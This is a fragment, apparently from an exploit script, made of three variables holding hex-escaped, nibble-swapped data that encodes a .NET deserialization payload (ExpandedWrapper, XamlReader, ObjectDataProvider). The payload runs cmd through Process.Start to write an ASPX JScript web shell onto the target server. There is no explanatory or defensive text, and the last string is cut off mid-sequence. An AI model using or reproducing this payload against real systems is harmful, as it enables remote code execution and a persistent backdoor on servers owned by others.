payload1='\\x5F\\x5F\\x62\\x70\\x38\\x32\\x63\\x31\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x65\\x32\\x30\\x30\\x34\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x65\\x32\\x30\\x30\\x33\\x35\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x36\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x39\\x34\\x30\\x30\\x65\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x65\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x65\\x32\\x30\\x30\\x35\\x34\\x30\\x30\\x38\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x37\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x30\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x30\\x36\\x30\\x30\\x32\\x33\\x30\\x30\\x62\\x35\\x30\\x30\\x62\\x35\\x30\\x30\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x65\\x32\\x30\\x30\\x37\\x35\\x30\\x30\\x39\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x37\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x64\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x62\\x36\\x30\\x30\\x35\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x38\\x35\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x32\\x35\\x30\\x30\\x35\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x63\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x36\\x34\\x30\\x30\\x32\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x37\\x37\\x30\\x30\\x66\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x62\\x36\\x30\\x30\\x63\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x36\\x35\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x34\\x33\\x30\\x30\\x65\\x32\\x30\\x30\\x30\\x33\\x30\\x30\\x65\\x32\\x30\\x30\\x30\\x33\\x30\\x30\\x65\\x32\\x30\\x30\\x30\\x33\\x30\\x30\\x63\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x33\\x34\\x30\\x30\\x35\\x37\\x30\\x30\\x63\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x65\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x35\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x63\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x35\\x30\\x30\\x35\\x37\\x30\\x30\\x32\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x39\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x62\\x34\\x30\\x30\\x35\\x36\\x30\\x30\\x39\\x37\\x30\\x30\\x34\\x35\\x30\\x30\\x66\\x36\\x30\\x30\\x62\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x33\\x33\\x30\\x30\\x31\\x33\\x30\\x30\\x32\\x36\\x30\\x30\\x36\\x36\\x30\\x30\\x33\\x33\\x30\\x30\\x38\\x33\\x30\\x30\\x35\\x33\\x30\\x30\\x36\\x33\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x33\\x33\\x30\\x30\\x36\\x33\\x30\\x30\\x34\\x33\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x33\\x30\\x30\\x35\\x33\\x30\\x30\\x64\\x35\\x30\\x30\\x63\\x32\\x30\\x30\\x62\\x35\\x30\\x30\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x65\\x32\\x30\\x30\\x37\\x35\\x30\\x30\\x39\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x37\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x34\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x65\\x32\\x30\\x30\\x66\\x34\\x30\\x30\\x32\\x36\\x30\\x30\\x61\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x36\\x30\\x30' payload2='\\x38\\x37\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x36\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x31\\x33\\x30\\x30\\x65\\x32\\x30\\x30\\x30\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x35\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x39\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x35\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x36\\x36\\x30\\x30\\x64\\x32\\x30\\x30\\x31\\x33\\x30\\x30\\x36\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x66\\x33\\x30\\x30\\x65\\x33\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x63\\x33\\x30\\x30\\x35\\x34\\x30\\x30\\x38\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x37\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x30\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x66\\x34\\x30\\x30\\x36\\x36\\x30\\x30\\x38\\x35\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x32\\x35\\x30\\x30\\x35\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x66\\x34\\x30\\x30\\x32\\x36\\x30\\x30\\x61\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x34\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x30\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x66\\x36\\x30\\x30\\x36\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x30\\x32\\x30\\x30\\x38\\x37\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x61\\x33\\x30\\x30\\x38\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x38\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x61\\x33\\x30\\x30\\x66\\x32\\x30\\x30\\x66\\x32\\x30\\x30\\x37\\x37\\x30\\x30\\x37\\x37\\x30\\x30\\x37\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x37\\x37\\x30\\x30\\x33\\x33\\x30\\x30\\x65\\x32\\x30\\x30\\x66\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x37\\x36\\x30\\x30\\x66\\x32\\x30\\x30\\x32\\x33\\x30\\x30\\x30\\x33\\x30\\x30\\x30\\x33\\x30\\x30\\x31\\x33\\x30\\x30\\x66\\x32\\x30\\x30\\x38\\x35\\x30\\x30\\x64\\x34\\x30\\x30\\x63\\x34\\x30\\x30\\x33\\x35\\x30\\x30\\x33\\x36\\x30\\x30\\x38\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x32\\x30\\x30\\x39\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x38\\x37\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x61\\x33\\x30\\x30\\x38\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x38\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x61\\x33\\x30\\x30\\x66\\x32\\x30\\x30\\x66\\x32\\x30\\x30\\x37\\x37\\x30\\x30\\x37\\x37\\x30\\x30\\x37\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x37\\x37\\x30\\x30\\x33\\x33\\x30\\x30\\x65\\x32\\x30\\x30\\x66\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x37\\x36\\x30\\x30\\x66\\x32\\x30\\x30\\x32\\x33\\x30\\x30\\x30\\x33\\x30\\x30\\x30\\x33\\x30\\x30\\x31\\x33\\x30\\x30\\x66\\x32\\x30\\x30\\x38\\x35\\x30\\x30\\x64\\x34\\x30\\x30\\x63\\x34\\x30\\x30\\x33\\x35\\x30\\x30\\x33\\x36\\x30\\x30\\x38\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x32\\x32\\x30\\x30\\x65\\x33\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x63\\x33\\x30\\x30\\x30\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x66\\x36\\x30\\x30\\x61\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x30\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x66\\x36\\x30\\x30\\x30\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x39\\x37\\x30\\x30\\x30\\x33\\x30\\x30\\x65\\x33\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x63\\x33\\x30\\x30\\x66\\x34\\x30\\x30\\x32\\x36\\x30\\x30\\x61\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x39\\x34\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x38\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x61\\x33\\x30\\x30\\x34\\x37\\x30\\x30\\x39\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x38\\x35\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x32\\x35\\x30\\x30\\x35\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x32\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x66\\x32\\x30\\x30\\x65\\x33\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x63\\x33\\x30\\x30\\x64\\x34\\x30\\x30\\x35\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x38\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x65\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x65\\x33\\x30\\x30\\x30\\x35\\x30\\x30\\x31\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x33\\x37\\x30\\x30' payload3='\\x61\\x33\\x30\\x30\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x62\\x33\\x30\\x30\\x31\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x32\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x39\\x37\\x30\\x30\\x64\\x33\\x30\\x30\\x64\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x33\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x63\\x36\\x30\\x30\\x39\\x36\\x30\\x30\\x32\\x36\\x30\\x30\\x32\\x32\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x38\\x37\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x61\\x33\\x30\\x30\\x34\\x34\\x30\\x30\\x39\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x33\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x64\\x32\\x30\\x30\\x65\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x61\\x33\\x30\\x30\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x65\\x32\\x30\\x30\\x34\\x34\\x30\\x30\\x39\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x31\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x32\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x39\\x37\\x30\\x30\\x64\\x33\\x30\\x30\\x33\\x37\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x32\\x32\\x30\\x30\\x36\\x32\\x30\\x30\\x37\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x36\\x32\\x30\\x30\\x63\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x66\\x34\\x30\\x30\\x32\\x36\\x30\\x30\\x61\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x34\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x30\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x66\\x36\\x30\\x30\\x36\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x30\\x32\\x30\\x30\\x38\\x37\\x30\\x30\\x61\\x33\\x30\\x30\\x62\\x34\\x30\\x30\\x35\\x36\\x30\\x30\\x39\\x37\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x63\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x35\\x37\\x30\\x30\\x65\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x38\\x36\\x30\\x30\\x33\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x38\\x36\\x30\\x30\\x32\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x66\\x34\\x30\\x30\\x32\\x36\\x30\\x30\\x61\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x34\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x62\\x37\\x30\\x30\\x38\\x37\\x30\\x30\\x61\\x33\\x30\\x30\\x34\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x30\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x34\\x34\\x30\\x30\\x39\\x36\\x30\\x30\\x31\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x61\\x33\\x30\\x30\\x30\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x66\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x64\\x37\\x30\\x30\\x32\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x64\\x34\\x30\\x30\\x35\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x38\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x65\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x33\\x35\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x32\\x30\\x30\\x36\\x32\\x30\\x30\\x37\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x36\\x32\\x30\\x30\\x63\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x66\\x34\\x30\\x30\\x32\\x36\\x30\\x30\\x61\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x34\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x30\\x35\\x30\\x30\\x32\\x37\\x30\\x30\\x66\\x36\\x30\\x30\\x36\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x64\\x34\\x30\\x30\\x35\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x38\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x30\\x35\\x30\\x30\\x31\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x36\\x32\\x30\\x30\\x37\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x36\\x32\\x30\\x30\\x63\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x61\\x33\\x30\\x30\\x33\\x35\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x36\\x32\\x30\\x30\\x37\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x33\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x36\\x32\\x30\\x30\\x63\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x66\\x32\\x30\\x30\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x61\\x33\\x30\\x30\\x33\\x35\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x36\\x32\\x30\\x30\\x37\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x64\\x30\\x30\\x30\\x61\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x39\\x30\\x30\\x30\\x36\\x32\\x30\\x30\\x63\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x61\\x33\\x30\\x30\\x33\\x35\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x36\\x32\\x30\\x30\\x37\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x66\\x32\\x30\\x30\\x33\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x36\\x30\\x30\\x38\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x65\\x35\\x30\\x30\\x36\\x32\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x30\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x63\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x35\\x32\\x30\\x30\\x30\\x34\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x35\\x30\\x30\\x31\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x63\\x34\\x30\\x30\\x31\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x35\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x61\\x34\\x30\\x30\\x33\\x37\\x30\\x30\\x33\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x30\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x35\\x32\\x30\\x30\\x65\\x35\\x30\\x30\\x36\\x32\\x30\\x30\\x37\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x65\\x35\\x30\\x30\\x36\\x32\\x30\\x30\\x31\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x30\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x63\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x35\\x32\\x30\\x30\\x36\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x37\\x30\\x30\\x37\\x37\\x30\\x30\\x34\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x34\\x37\\x30\\x30\\x66\\x36\\x30\\x30\\x64\\x36\\x30\\x30\\x32\\x32\\x30\\x30\\x62\\x33\\x30\\x30\\x36\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x30\\x32\\x30\\x30\\x35\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x35\\x30\\x30\\x35\\x36\\x30\\x30\\x31\\x37\\x30\\x30\\x35\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x35\\x35\\x30\\x30\\x33\\x37\\x30\\x30\\x35\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x31\\x34\\x30\\x30\\x37\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x34\\x37\\x30\\x30\\x62\\x33\\x30\\x30\\x39\\x36\\x30\\x30\\x36\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x38\\x32\\x30\\x30\\x35\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x33\\x35\\x30\\x30\\x35\\x37\\x30\\x30\\x32\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x39\\x36\\x30\\x30\\x65\\x36\\x30\\x30\\x37\\x36\\x30\\x30\\x38\\x32\\x30\\x30\\x30\\x33\\x30\\x30\\x63\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x35\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30\\x30\\x65\\x32\\x30\\x30\\x39\\x34\\x30\\x30\\x65\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x38\\x37\\x30\\x30\\x66\\x34\\x30\\x30\\x36\\x36\\x30\\x30\\x38\\x32